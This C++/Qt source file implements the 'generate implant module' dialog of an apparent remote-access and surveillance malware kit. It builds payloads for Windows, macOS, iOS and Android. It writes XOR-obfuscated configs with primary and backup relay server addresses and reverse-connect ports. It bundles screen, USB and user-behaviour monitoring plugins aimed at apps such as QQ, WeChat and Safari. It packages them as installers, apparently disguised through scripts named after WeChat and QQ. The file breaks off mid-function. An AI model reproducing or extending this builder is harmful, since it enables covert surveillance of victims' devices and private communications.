#include "generatedlg.h"

#include "adkprecomp.h"
#include "adkmemory.h"

#include "include/T5.h"
#include "maindlg.h"
#include "Utility.h"

#include "Winsock2.h"

#include "nofocusstyle.h"

#include "include/PacketType.h"

#include <QtGui>
#include <QFileDialog>
#include <vector>
#include <string>

#include <Ws2tcpip.h>

class GenerateThread : public QThread
{
public:
	explicit GenerateThread(const std::wstring& path, const bool* plgLayout)
		: m_path(path)
		, m_plgLayout(plgLayout)
	{

	}

	virtual ~GenerateThread(){}
protected:

	virtual void run() = 0;

	const std::wstring& GetPath()
	{
		return m_path;
	}

	const bool* GetPlgLayout()
	{
		return m_plgLayout;
	}

private:
	std::wstring m_path;
	const bool* m_plgLayout;
};

class GenerateWindowsThread : public GenerateThread
{
public:
	GenerateWindowsThread(const std::wstring& path, const bool* plgLayout)
		: GenerateThread(path, plgLayout)
	{

	}

protected:
	void run()
	{
		std::wstring plgPath = GetExePath() + L"\\Support\\Windows\\Plat1Gui.dll";
		HMODULE hMod = LoadLibraryW(plgPath.c_str());

		LPPACKETINIT lpfnPacketInit ;
		LPPLAT1SHOWGUI lpfnPlat1ShowGui;
		PACKET_FUNCTION_POINTER packetFunc;
		PLAT_FILE_TYPE platFileType;

		if ( hMod )
		{
			lpfnPacketInit = (LPPACKETINIT)GetProcAddress(hMod, PLAT1_GUI_FUNC1);
			lpfnPlat1ShowGui = (LPPLAT1SHOWGUI)GetProcAddress(hMod, PLAT1_GUI_FUNC2);
			if ( lpfnPacketInit && lpfnPlat1ShowGui )
			{
				lpfnPacketInit(&packetFunc);

				// 插件 1
				platFileType.b64Bit = TRUE;
				platFileType.dwFileType = PLAT_FILE_TYPE_3;
				platFileType.productMark.dwProductID = 0x10;
				platFileType.productMark.dwPluginNumber = 1;		// 此处插件号 必须为 1
				platFileType.productMark.dwInternalVersion = 1;
				std::wstring localPath = GetExePath() + L"\\_Plugin\\WINDOWS\\1.dat";
				std::wstring targetName = AnsiToWide(FrmMain->WindowsPlgCxtVect[1]->lpszPluginName);
				lstrcpyW(platFileType.wzLocalFileName, localPath.c_str());
				lstrcpyW(platFileType.wzTargetFileName, targetName.c_str());

				packetFunc.lpAddFile(&platFileType);

				const bool* plgLayout = GetPlgLayout();

				if ( plgLayout[2] )
				{
					// 插件 2
					platFileType.b64Bit = TRUE;
					platFileType.dwFileType = PLAT_FILE_TYPE_3;
					platFileType.productMark.dwProductID = 0x10;
					platFileType.productMark.dwPluginNumber = 2;
					platFileType.productMark.dwInternalVersion = 2;
					localPath = GetExePath() + L"\\_Plugin\\WINDOWS\\2.dat";
					targetName = AnsiToWide(FrmMain->WindowsPlgCxtVect[2]->lpszPluginName);
					lstrcpyW(platFileType.wzLocalFileName, localPath.c_str());
					lstrcpyW(platFileType.wzTargetFileName, targetName.c_str());

					packetFunc.lpAddFile(&platFileType);
				}

				if ( plgLayout[3] )
				{
					// 插件 3
					platFileType.b64Bit = TRUE;
					platFileType.dwFileType = PLAT_FILE_TYPE_3;
					platFileType.productMark.dwProductID = 0x10;
					platFileType.productMark.dwPluginNumber = 3;
					platFileType.productMark.dwInternalVersion = 3;
					localPath = GetExePath() + L"\\_Plugin\\WINDOWS\\3.dat";
					targetName = AnsiToWide(FrmMain->WindowsPlgCxtVect[3]->lpszPluginName);
					lstrcpyW(platFileType.wzLocalFileName, localPath.c_str());
					lstrcpyW(platFileType.wzTargetFileName, targetName.c_str());

					packetFunc.lpAddFile(&platFileType);
				}

				if ( plgLayout[4] )
				{
					// 插件 4
					platFileType.b64Bit = TRUE;
					platFileType.dwFileType = PLAT_FILE_TYPE_3;
					platFileType.productMark.dwProductID = 0x10;
					platFileType.productMark.dwPluginNumber = 4;
					platFileType.productMark.dwInternalVersion = 4;
					localPath = GetExePath() + L"\\_Plugin\\WINDOWS\\4.dat";
					targetName = AnsiToWide(FrmMain->WindowsPlgCxtVect[4]->lpszPluginName);
					lstrcpyW(platFileType.wzLocalFileName, localPath.c_str());
					lstrcpyW(platFileType.wzTargetFileName, targetName.c_str());

					packetFunc.lpAddFile(&platFileType);	
				}

				// 配置文件
				platFileType.b64Bit = TRUE;
				platFileType.dwFileType = PLAT_FILE_TYPE_4;
				platFileType.productMark.dwProductID = 0x10;
				platFileType.productMark.dwPluginNumber = 5;
				platFileType.productMark.dwInternalVersion = 5;
				localPath = GetExePath() + L"\\_Plugin\\WINDOWS\\dtl.dat";
				lstrcpyW(platFileType.wzLocalFileName, localPath.c_str());
				lstrcpyW(platFileType.wzTargetFileName, L"Data\\dtl.dat");

				packetFunc.lpAddFile(&platFileType);

				// 配置文件
				platFileType.b64Bit = TRUE;
				platFileType.dwFileType = PLAT_FILE_TYPE_4;
				platFileType.productMark.dwProductID = 0x10;
				platFileType.productMark.dwPluginNumber = 6;
				platFileType.productMark.dwInternalVersion = 6;
				localPath = GetExePath() + L"\\_Plugin\\WINDOWS\\glp.uin";
				lstrcpyW(platFileType.wzLocalFileName, localPath.c_str());
				lstrcpyW(platFileType.wzTargetFileName, L"Data\\glp.uin");

				packetFunc.lpAddFile(&platFileType);

				lpfnPlat1ShowGui(NULL, 0x10);
			}
			FreeLibrary(hMod);
		}
	}
};

class GenerateMacThread : public GenerateThread
{
public:
	GenerateMacThread(const std::wstring& path, const bool* plgLayout)
		: GenerateThread(path, plgLayout)
	{

	}
protected:
	void run()
	{
		std::wstring exePath = GetExePath();
		std::vector<std::wstring> plgName;

		std::wstring destDir = exePath + L"\\Support\\MacOS\\Update.app\\Contents\\MacOS";
		std::vector<std::wstring> dstPlgName;

		PPLUGIN_CXT plgCxt = NULL;

		const bool* plgLayout = GetPlgLayout();

		for ( int i = 1; i < MAX_PLG_COUNT; i++ )
		{
			plgCxt = FrmMain->MacPlgCxtVect[i];

			if ( NULL == plgCxt || !plgLayout[i] )
			{
				continue;
			}

			WCHAR wzPlgName[MAX_PATH] = {0};
			wsprintf(wzPlgName, L"%s\\_Plugin\\MACOSX\\%d.dat", exePath.c_str(), i);
			plgName.push_back(wzPlgName);

			wsprintf(wzPlgName, L"%s\\%d.dat", destDir.c_str(), i);
			dstPlgName.push_back(wzPlgName);
		}
		plgName.push_back(exePath + L"\\_Plugin\\MACOSX\\dtl.dat");
		plgName.push_back(exePath + L"\\_Plugin\\MACOSX\\glp.uin");
		plgName.push_back(exePath + L"\\_Plugin\\MACOSX\\plugin.dat");

		dstPlgName.push_back(destDir + L"\\dtl.dat");
		dstPlgName.push_back(destDir + L"\\glp.uin");
		dstPlgName.push_back(destDir + L"\\plugin.dat");

		// 移动文件
		std::vector<std::wstring>::iterator  it = plgName.begin();
		std::vector<std::wstring>::iterator  it2 = dstPlgName.begin();
		for ( ;it != plgName.end(); it++, it2++ )
		{
			CopyFile(it->c_str(), it2->c_str(), FALSE);
		}

		// 复制 detect.app.zip　至 update.app 下
		std::wstring detect = exePath + L"\\Support\\MacOS\\detect.app.zip";
		std::wstring dstDetect = destDir + L"\\detect.app.zip";
		//CreateDirectoryW(dstDetect.c_str(), NULL);

		if ( !CopyFileW(detect.c_str(), dstDetect.c_str(), FALSE) )
		{
			MessageBoxW(NULL, L"生成失败：复制文件失败", L"错误", MB_OK);
			return;
		}

		// update.app 复制到临时目录
		std::wstring temp = exePath + L"\\Support\\MacOS\\temp\\";
		CreateDirectoryW(temp.c_str(), NULL);
		temp += L"Update.app\\";
		CreateDirectoryW(temp.c_str(), NULL);
		std::wstring update = exePath + L"\\Support\\MacOS\\Update.app\\*";

		if ( !SHCopy(update.c_str(), temp.c_str()) )
		{
			MessageBoxW(NULL, L"生成失败：复制文件夹失败", L"错误", MB_OK);
			return;
		}

		// 打包
		std::wstring toolPath = exePath + L"\\Support\\MacOS\\mkisofs.exe";
		std::wstring output = std::wstring(L"\"") + GetPath() + L"\"";
		std::wstring input = std::wstring(L"\"") + exePath + L"\\Support\\MacOS\\temp\"";

		WCHAR wzCmdline[1024] = {0};
		wsprintf(wzCmdline, L"\"%s\" -J -R -o %s -mac-name -V -apple -v -dir-mode 777 -file-mode 777 %s",
			toolPath.c_str(), output.c_str(), input.c_str());

		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi, sizeof(pi) );

		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		CreateProcess(NULL, wzCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

		WaitForSingleObject( pi.hProcess, INFINITE );
		CloseHandle( pi.hProcess );
		CloseHandle( pi.hThread );

		// 删除临时目录
		WCHAR wzTemp[MAX_PATH] = {0};
		wsprintf(wzTemp, L"%s\\Support\\MacOS\\Temp", exePath.c_str());
		SHDel(wzTemp);

		// 删除 update.app 中的 detect.app.zip
		wsprintf(
			wzTemp, 
			L"%s\\Support\\MacOS\\Update.app\\Contents\\MacOS\\detect.app.zip", 
			exePath.c_str());
		DeleteFileW(wzTemp);

		MessageBoxA(NULL, "成功生成目标端!", "提示", MB_OK | MB_ICONINFORMATION);
		SetStatusInfoW(STATUS_INFO, L"成功生成目标端!");
	}
};

/*!
\brief
	生成 IOS 目标端
*/
class GenerateIOSThread : public GenerateThread
{
public:
	GenerateIOSThread(const std::wstring& path, const bool* plgLayout)
		: GenerateThread(path, plgLayout)
	{

	}
protected:
	void run()
	{
		// 复制 1.dat 2.dat 4.dat 至 Support\IOS\Plugin

		std::wstring plgPath = GetExePath() + L"\\_Plugin\\IOS";
		std::wstring dstPlgPath = GetExePath() + L"\\Support\\IOS\\Plugin";

		PPLUGIN_CXT plgCxt = NULL;

		const bool* plgLayout = GetPlgLayout();

		for ( int i = 1; i < MAX_PLG_COUNT; i++ )
		{
			plgCxt = FrmMain->IosPlgCxtVect[i];

			if ( NULL == plgCxt || !plgLayout[i])
			{
				continue;
			}

			WCHAR wzPlgName[MAX_PATH] = {0};
			wsprintf(wzPlgName, L"%s\\%d.dat", plgPath.c_str(), i);

			WCHAR wzDstPlgName[MAX_PATH] = {0};
			wsprintf(wzDstPlgName, L"%s\\%d.dat", dstPlgPath.c_str(), i);

			CopyFile(wzPlgName, wzDstPlgName, FALSE);
		}

		// 复制配置文件
		WCHAR wzCfgName[MAX_PATH] = {0};
		wsprintf(wzCfgName, L"%s\\glp.uin", plgPath.c_str());
		WCHAR wzDstCfgName[MAX_PATH] = {0};
		wsprintf(wzDstCfgName, L"%s\\glp.uin", dstPlgPath.c_str());
		CopyFileW(wzCfgName, wzDstCfgName, FALSE);

		wsprintf(wzCfgName, L"%s\\dtl.dat", plgPath.c_str());
		wsprintf(wzDstCfgName, L"%s\\dtl.dat", dstPlgPath.c_str());
		CopyFileW(wzCfgName, wzDstCfgName, FALSE);

		wsprintf(wzCfgName, L"%s\\plugin.dat", plgPath.c_str());
		wsprintf(wzDstCfgName, L"%s\\plugin.dat", dstPlgPath.c_str());
		CopyFileW(wzCfgName, wzDstCfgName, FALSE);

		// 调用 packet.exe

		WCHAR wzCmdline[MAX_PATH] = {0};

		wsprintf(wzCmdline, L"%s\\Support\\IOS\\packet.exe \"%s\"", GetExePath().c_str(), GetPath().c_str());

		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi, sizeof(pi) );

		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		CreateProcess(NULL, wzCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

		WaitForSingleObject( pi.hProcess, INFINITE );
		CloseHandle( pi.hProcess );
		CloseHandle( pi.hThread );
	}
};

/*!
\brief
	生成 Android 目标端
*/

const std::wstring PacketApkScript[] = {L"packet_weixin.bat", L"packet_QQ.bat"};

class GenerateAndroidThread : public GenerateThread
{
public:
	GenerateAndroidThread(const std::wstring& path, const bool* plgLayout, bool rooted, const std::wstring script)
		: GenerateThread(path, plgLayout)
		, m_rooted(rooted)
		, m_script(script)
	{

	}

protected:
	void run()
	{
		if ( TYPE_EXE == GetTargetType() )
		{
			GenerateExe();
		}
		else if ( TYPE_APK == GetTargetType() )
		{
			GenerateApk();
		}
	}

private:
	enum TargetType{TYPE_APK, TYPE_EXE};
	int GetTargetType()
	{
		const std::wstring& path = GetPath();
		if ( path[path.length()-3] == L'a'
			&& path[path.length()-2] == L'p'
			&& path[path.length()-1] == L'k' )
			return TYPE_APK;
		else
			return TYPE_EXE;
	}
	void GenerateExe()
	{
		// 调用 packet.exe，生成 exe
		WCHAR wzCmdline[MAX_PATH] = {0};

		wsprintf(wzCmdline, L"%s\\Support\\Android\\Local\\packet.exe \"%s\" %s", 
			GetExePath().c_str(), GetPath().c_str(),
			m_rooted ? L"root" : L"unroot");

		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi, sizeof(pi) );

		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		CreateProcess(NULL, wzCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

		WaitForSingleObject( pi.hProcess, INFINITE );
		CloseHandle( pi.hProcess );
		CloseHandle( pi.hThread );
	}

	bool JREInstalled()
	{
		HKEY key;
		HRESULT result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Javasoft\\Java Runtime Environment", NULL, KEY_READ | KEY_WOW64_64KEY, &key);

		if ( ERROR_SUCCESS == result )
		{
			RegCloseKey(key);
			return true;
		}
		
		result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Javasoft\\Java Runtime Environment", NULL, KEY_READ | KEY_WOW64_32KEY, &key);

		if ( ERROR_SUCCESS == result )
		{
			RegCloseKey(key);
			return true;
		}
		
		return false;
	}

	void GenerateApk()
	{
		if ( !JREInstalled() )
		{
			MessageBoxW(NULL, L"未安装 java 运行环境，无法生成 apk 安装包，请安装 java 运行环境后重试!", L"提示", MB_OK | MB_ICONINFORMATION);
			return;
		}

		SHELLEXECUTEINFOW sei;
		memset(&sei, 0, sizeof(SHELLEXECUTEINFO)); 
		std::wstring batPath = GetExePath() + L"\\Support\\Android\\Remote\\" + m_script;

		sei.cbSize = sizeof(SHELLEXECUTEINFO);
		sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_DOENVSUBST;
		sei.lpVerb = L"open";
		sei.lpFile = batPath.c_str();
		sei.nShow = SW_HIDE;

		PVOID oldValue = NULL;
		if ( Is64Bit() && !oldValue )
		{
			HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
			pWow64DisableWow64FsRedirection foo = (pWow64DisableWow64FsRedirection)GetProcAddress(kernel32, "Wow64DisableWow64FsRedirection");
			foo(&oldValue);
		}

		ShellExecuteExW(&sei);
		WaitForSingleObject(sei.hProcess, INFINITE);
		CloseHandle(sei.hProcess);

		if ( Is64Bit() && oldValue )
		{
			HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
			pWow64RevertWow64FsRedirection foo = (pWow64RevertWow64FsRedirection)GetProcAddress(kernel32, "Wow64RevertWow64FsRedirection");
			foo(oldValue);
		}

		std::wstring target = GetExePath() + L"\\Support\\Android\\Remote\\TInstall_signed.apk";

		if ( CopyFileW(target.c_str(), GetPath().c_str(), FALSE) )
		{
			DeleteFileW(target.c_str());
			MessageBoxW(NULL, L"目标生成成功!", L"提示", MB_OK | MB_ICONINFORMATION);
		}
		else
		{
			WCHAR text[MAX_PATH] = {0};
			wsprintf(text, L"目标生成失败!\r\n错误码:%d", GetLastError());
			MessageBoxW(NULL, text, L"提示", MB_OK | MB_ICONERROR);
		}
	}

private:
	bool m_rooted;
	std::wstring m_script;
};

// ////////////////////////////////////////////////////////////////////////////////
// @public 构造函数
//
GenerateDlg::GenerateDlg(QWidget *parent)
	: QDialog(parent)
	, m_genThread(NULL)
	, m_waitDlg(NULL)
{
	this->setWindowFlags(Qt::Dialog | Qt::WindowTitleHint | Qt::MSWindowsFixedSizeDialogHint);
	ui.setupUi(this);

	tab2 = ui.tabWidget->widget(1);

	ui.lstPlatform->setStyle(new NoFocusStyle(this));

	QValidator* mask = new QRegExpValidator(QRegExp("[0-9]{1,8}"));
	ui.edtGroupId->setValidator(mask);

	m_ipMask = new QRegExpValidator(QRegExp("[0-9,\\.]+"));
	ui.edtIp->setValidator(m_ipMask);
	ui.edAlternateIp->setValidator(m_ipMask);

	QIntValidator* portMask = new QIntValidator(0, 65535);
	ui.edtPort->setValidator(portMask);
	ui.edtAlternatePort->setValidator(portMask);

	ui.lstPlatform->item(0)->setSelected(true);
	setWindowTitle(QString::fromLocal8Bit("生成植入模块 - Windows"));
	m_curSystem = L"WINDOWS";

	connect(ui.btnOk, SIGNAL(clicked()), this, SLOT(GenerateTarget()));
	connect(ui.btnCancel, SIGNAL(clicked()), this, SLOT(reject()));

	connect(ui.lstPlatform, SIGNAL(itemClicked(QListWidgetItem*)), this, SLOT(PlatformChanged(QListWidgetItem*)));
	connect(ui.cmbIp1, SIGNAL(currentIndexChanged(int)), this, SLOT(ServerTypeChanged_1(int)));
	connect(ui.cmbIp2, SIGNAL(currentIndexChanged(int)), this, SLOT(ServerTypeChanged_2(int)));
	connect(ui.btnGetIP, SIGNAL(clicked()), this, SLOT(GetIP()));
	connect(ui.btnGetIP2, SIGNAL(clicked()), this, SLOT(GetIP()));
	connect(ui.chkRooted, SIGNAL(clicked()), this, SLOT(RootStatusChanged()));
	connect(ui.chkNotRooted, SIGNAL(clicked()), this, SLOT(RootStatusChanged()));
	connect(ui.chkLocal, SIGNAL(clicked()), this, SLOT(EnvironmentChanged()));
	connect(ui.chkRemote, SIGNAL(clicked()), this, SLOT(EnvironmentChanged()));

	EnvironmentChanged();

	InitCustomGui();

	m_waitDlg = new WaitDlg(this);
	m_waitDlg->hide();

}

// ////////////////////////////////////////////////////////////////////////////////
// @public 析构函数
//
GenerateDlg::~GenerateDlg()
{
	delete m_waitDlg;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 生成目标
//
void GenerateDlg::GenerateTarget()
{
	//
	// 生成配置文件
	//
	if ( !GenerateMainCfg() || 
		!GeneratePlgCfg() ||
		!GeneratePlgNameCfg() )
	{
		return;
	}

	// 更新嵌入的插件
	UpdatePluginEnabled();

	// WINDOWS 打包暂时交给 Plat1Gui.dll 处理，
	// 后面要改到这里来统一处理
	//
	if ( L"WINDOWS" == m_curSystem )
	{
		m_genThread = new GenerateWindowsThread(L"", GetPluginEnabledLayout());

		if ( m_genThread != NULL )
		{
			connect(m_genThread, SIGNAL(finished()), this, SLOT(GenerateFinished()));
			m_genThread->start();
			m_waitDlg->show();
		}

		return;
	}

	// 获取生成路径
	//
	QString dir;
	if ( L"MACOSX" == m_curSystem )
	{
		dir = QFileDialog::getSaveFileName(this, QString::fromLocal8Bit("输入文件名..."),
			"mac_install.dmg", "(*.dmg)");
	}
	else if ( L"IOS" == m_curSystem)
	{
		dir = QFileDialog::getSaveFileName(this, QString::fromLocal8Bit("输入文件名..."),
			"ios_install.exe", "(*.exe)");
	}
	else if ( L"Android" == m_curSystem )
	{
		if ( ui.chkRemote->isChecked() )
		{
			dir = QFileDialog::getSaveFileName(this, QString::fromLocal8Bit("输入文件名..."),
				"android_install.exe", "(*.exe)");	
		}
		else
		{
			dir = QFileDialog::getSaveFileName(this, QString::fromLocal8Bit("输入文件名..."),
				"android_install.apk", "(*.apk)");	
		}
	}

	dir.replace('/', '\\');

	if ( dir == "" )
	{
		return;
	}

	// D:\ -> D:
	if ( dir.length() == 3 )
	{
		dir = dir.left(2);
	}

	// 打包
	//
	m_genThread = CreateGenerateThread(dir.toStdWString());

	if ( m_genThread != NULL )
	{
		connect(m_genThread, SIGNAL(finished()), this, SLOT(GenerateFinished()));
		m_genThread->start();
		m_waitDlg->show();
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 平台变化
//
void GenerateDlg::PlatformChanged(QListWidgetItem* item)
{
	// 不同平台的配置选项不一样，
	// 这里根据平台的不同显示不同的配置项
	if ( "Windows" == item->text() )
	{
		ui.lbWindowTitle->show();
		ui.edtWindowTitle->show();
		ui.grpUsb->show();
		ui.chkPlg2->show();
		ui.chkPlg3->show();
		ui.chkPlg3->setChecked(true);
		ui.chkPlg4->show();
		ui.grpNetEnvironment->hide();
		ui.grpEnvironment->hide();
		ui.grpRoot->hide();
		ui.grpHttps->hide();
		ui.chkPlg2->setEnabled(true);
		ui.chkPlg3->setEnabled(true);
		ui.chkPlg4->setEnabled(true);
		ui.chkPlg4->setText(QString::fromLocal8Bit("多媒体插件"));
		setWindowTitle(QString::fromLocal8Bit("生成植入模块 - Windows"));
		ui.tabWidget->insertTab(1, tab2, QString::fromLocal8Bit("用户行为插件"));
		ui.tabWidget->setTabText(2, QString::fromLocal8Bit("USB 及屏幕监控插件"));
		m_curSystem = L"WINDOWS";
	}

	if ( "Mac OS" == item->text() )
	{
		ui.lbWindowTitle->show();
		ui.edtWindowTitle->show();
		ui.grpUsb->show();
		ui.chkPlg2->show();
		ui.chkPlg3->show();
		ui.chkPlg3->setChecked(true);
		ui.chkPlg4->show();
		ui.grpNetEnvironment->hide();
		ui.grpEnvironment->hide();
		ui.grpRoot->hide();
		ui.chkPlg2->setEnabled(false);
		ui.chkPlg3->setEnabled(false);
		ui.chkPlg4->setEnabled(false);
		ui.chkPlg4->setText(QString::fromLocal8Bit("屏幕截图插件"));
		if ( L"WINDOWS" == m_curSystem )
		{
			ui.tabWidget->removeTab(1);
		}
		setWindowTitle(QString::fromLocal8Bit("生成植入模块 - MacOS"));
		m_curSystem = L"MACOSX";
		ui.edtProcName->setText(QString::fromLocal8Bit("finfer;safari;iphoto;终端;备忘录;邮件;QQ;"));
		ui.tabWidget->setTabText(1, QString::fromLocal8Bit("USB 及屏幕监控插件"));
	}

	if ( "IOS" == item->text() )
	{
		ui.lbWindowTitle->hide();
		ui.edtWindowTitle->hide();
		ui.chkPlg2->show();
		ui.chkPlg3->hide();
		ui.chkPlg3->setChecked(false);
		ui.chkPlg4->show();
		ui.grpUsb->hide();
		ui.grpEnvironment->hide();
		ui.grpNetEnvironment->hide();
		ui.grpRoot->hide();
		ui.chkPlg2->setEnabled(false);
		ui.chkPlg3->setEnabled(false);
		ui.chkPlg4->setEnabled(false);
		ui.chkPlg4->setText(QString::fromLocal8Bit("屏幕监控插件"));
		if ( L"WINDOWS" == m_curSystem )
		{
			ui.tabWidget->removeTab(1);
		}
		setWindowTitle(QString::fromLocal8Bit("生成植入模块 - IOS"));
		m_curSystem = L"IOS";
		ui.edtProcName->setText(QString::fromLocal8Bit("MobileSafari;notifyd;ipadqq;iFile_;finder;"));
		ui.tabWidget->setTabText(1, QString::fromLocal8Bit("屏幕监控插件"));
	}

	if ( "Android" == item->text() )
	{
		ui.lbWindowTitle->hide();
		ui.edtWindowTitle->hide();
		ui.chkPlg3->hide();
		ui.chkPlg3->setChecked(false);
		ui.grpUsb->hide();

		//ui.grpEnvironment->show();
		ui.grpEnvironment->hide();
		//ui.grpRoot->show();
		// 暂时不需要此功能
		//ui.grpEnvironment->hide();
		ui.grpRoot->hide();

		ui.grpNetEnvironment->hide();
		ui.chkPlg2->setEnabled(false);
		ui.chkPlg3->setEnabled(false);
		ui.chkPlg4->setEnabled(false);
		ui.chkPlg4->setText(QString::fromLocal8Bit("屏幕监控插件"));
		RootStatusChanged();
		if ( L"WINDOWS" == m_curSystem )
		{
			ui.tabWidget->removeTab(1);
		}
		setWindowTitle(QString::fromLocal8Bit("生成植入模块 - Android"));
		m_curSystem = L"Android";
		ui.edtProcName->setText(QString::fromLocal8Bit("qq;weixin;"));
		ui.tabWidget->setTabText(1, QString::fromLocal8Bit("屏幕监控插件"));
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 生成 dtl.dat
//
bool GenerateDlg::GenerateMainCfg()
{
	// 生成主配置文件
	//      TargetID | FlagId | LiveFlag | TmpDataUpperLimit | TmpDataPos | DiskFreeBlowLimit | PlaceHolder | DaemonAddrCount
	//         0          1         2               3               4               5               6               7
	//      DaemonAddrType DaemonPort DaemonIp Domain Daemon2AddrType Daemon2Port Daemon2Ip Domain2
	//

	BYTE sOutline[4096] = {0};

	PDWORD lpdwOutline = (PDWORD)sOutline;
	int  pos = 0;

	*lpdwOutline++ = 0;     
	*lpdwOutline++ = ui.edtGroupId->text().toInt();
	*lpdwOutline++ = 197877;
	*lpdwOutline++ = 10 * 1024 * 1024;
	*lpdwOutline++ = 0;

	*lpdwOutline++ = 50 * 1024 * 1024;         // 最小限制，默认是50M，这个接口暂时没有对用户开放
	*lpdwOutline++ = 0;						   // 占位符，已和原来的版本相区别

	if ( ui.chkAlternate->isChecked() )
	{
		*lpdwOutline++ = 2;
	}
	else
	{
		*lpdwOutline++ = 1;
	}

	pos += (sizeof(ULONG) * 8);

	DAEMONADDR  daemonAddr1;
	DAEMONADDR  daemonAddr2;

	ZeroMemory(daemonAddr1.szDomainName, 64);
	ZeroMemory(daemonAddr2.szDomainName, 64);

	daemonAddr1.dwIp    = 0;
	daemonAddr1.dwPort  = 0;
	daemonAddr2.dwIp    = 0;
	daemonAddr2.dwPort  = 0;

	daemonAddr1.dwAddrType = ui.cmbIp1->currentIndex();
	if ( daemonAddr1.dwAddrType == 0 )
	{
		// IP地址
		//
		daemonAddr1.dwIp = inet_addr(ui.edtIp->text().toStdString().c_str());

		if (INADDR_NONE == daemonAddr1.dwIp || 0 == ui.edtIp->text().length() )
		{
			MessageBoxA((HWND)winId(), "主中转服务器地址输入不正确!", "提示", MB_OK | MB_ICONINFORMATION);
			return false;
		}
	}
	else
	{
		// 域名
		//
		DWORD dwAddr = inet_addr(ui.edtIp->text().toStdString().c_str());
		if (INADDR_NONE != dwAddr)
		{
			MessageBoxA((HWND)winId(), "主中转服务器输入地址不是域名格式!", "提示", MB_OK | MB_ICONINFORMATION);
			return false;
		}

		strcpy(daemonAddr1.szDomainName, ui.edtIp->text().toStdString().c_str());
	}

	long port = ui.edtPort->text().toInt();

	if (INADDR_NONE == port)
	{
		MessageBoxA((HWND)winId(), "主中转反弹端口输入不正确!", "提示", MB_OK | MB_ICONINFORMATION);
		return false;
	}

	daemonAddr1.dwPort = port;

	//
	// 备用中转参数
	//
	if ( ui.chkAlternate->isChecked() )
	{
		daemonAddr2.dwAddrType = ui.cmbIp2->currentIndex();

		if ( daemonAddr2.dwAddrType == 0 )
		{
			// IP地址
			//
			daemonAddr2.dwIp = inet_addr(ui.edAlternateIp->text().toStdString().c_str());

			if (INADDR_NONE == daemonAddr2.dwIp || 0 == ui.edAlternateIp->text().length())
			{
				MessageBoxA((HWND)winId(), "备用中转服务器地址输入不正确!", "提示", MB_OK | MB_ICONINFORMATION);
				return false;
			}
		}
		else
		{
			// 域名
			//
			DWORD dwAddr = inet_addr(ui.edAlternateIp->text().toStdString().c_str());
			if (INADDR_NONE != dwAddr)
			{
				MessageBoxA((HWND)winId(), "备用中转服务器输入地址不是域名格式!", "提示", MB_OK | MB_ICONINFORMATION);
				return false;
			}

			strcpy(daemonAddr2.szDomainName, ui.edAlternateIp->text().toStdString().c_str());
		}

		port = ui.edtAlternatePort->text().toInt();

		if (INADDR_NONE == port)
		{
			MessageBoxA((HWND)winId(), "备用中转反弹端口输入不正确!", "提示", MB_OK | MB_ICONINFORMATION);
			return false;
		}

		daemonAddr2.dwPort = port;
	}

	// 主中转服务器
	//
	AdkXorMemory((PBYTE)&daemonAddr1, 95, sizeof(DAEMONADDR));        // 异或结构
	memcpy(sOutline + pos, (void *)&daemonAddr1, sizeof(DAEMONADDR));
	pos += sizeof(DAEMONADDR);
	AdkXorMemory((PBYTE)&daemonAddr1, 95, sizeof(DAEMONADDR));        // 再次异或

	// 备用中转服务器
	//
	if ( ui.chkAlternate->isChecked() )
	{
		AdkXorMemory((PBYTE)&daemonAddr2, 95, sizeof(DAEMONADDR));    // 异或结构
		memcpy(sOutline + pos, (void *)&daemonAddr2, sizeof(DAEMONADDR));
		pos += sizeof(DAEMONADDR);
		AdkXorMemory((PBYTE)&daemonAddr2, 95, sizeof(DAEMONADDR));    // 再次异或        
	}

	// 插件启用与否
	DWORD pluginEnabled = 0xFFFFFFFF;
	memcpy(sOutline + pos, (void *)&pluginEnabled, sizeof(DWORD));
	pos += sizeof(DWORD);

	std::wstring cfgPath = GetExePath() + L"\\_Plugin\\" + this->m_curSystem + L"\\dtl.dat";

	// 写到文件中
	//
	HANDLE hFile = CreateFile(
		cfgPath.c_str(),
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	DWORD dwByteWritten;
	bool bRet = WriteFile(hFile, sOutline, pos, &dwByteWritten, NULL);
	CloseHandle(hFile);

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 生成 glp.uin
//
bool GenerateDlg::GeneratePlgCfg()
{
	// Plugin list
	//		FirPlgLen FirPlgContent SecPlgLen SecPlgContent .....
	//
	// NPlgContent:
	//		PID FILENAMELEN FILENAME VER UPDATEVER TYPE PROCLEN PROC DATALEN DATA
	//		 1        2         3     4      5       6      7     8     9     10
	//
	// Note:
	//      UPDATEVER   -- default value is zero
	//      PROC list (include null terminal)
	//

	BYTE sOutline[16 * 1024] = {0};
	PPLUGIN_CXT pluginCxt;
	int pos = 0;

	ZeroMemory(sOutline, 16 * 1024);

	// pluginId starts from 0
	//
	ULONG           vectKey = 0;
	ULONG			plgLen;
	int             nPluginNameLen;
	int             nProcListLen;
	int             nPluginDataLen;
	PVOID           lpPluginData;

